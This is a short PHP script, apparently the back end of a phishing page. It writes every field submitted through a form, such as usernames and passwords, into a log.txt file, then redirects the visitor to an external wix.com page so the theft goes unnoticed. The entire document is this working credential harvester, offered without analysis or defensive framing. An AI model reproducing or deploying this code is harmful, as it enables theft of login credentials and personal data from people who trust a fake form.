<?php

header ('Location: http://b232318.wix.com/got2gofast');

$handle = fopen("log.txt", "a");

foreach($_POST as $variable => $value) {

   fwrite($handle, $variable);

   fwrite($handle, "=");

   fwrite($handle, $value);

   fwrite($handle, "\r\n");

}

fwrite($handle, "\r\n");

fclose($handle);

exit;

?>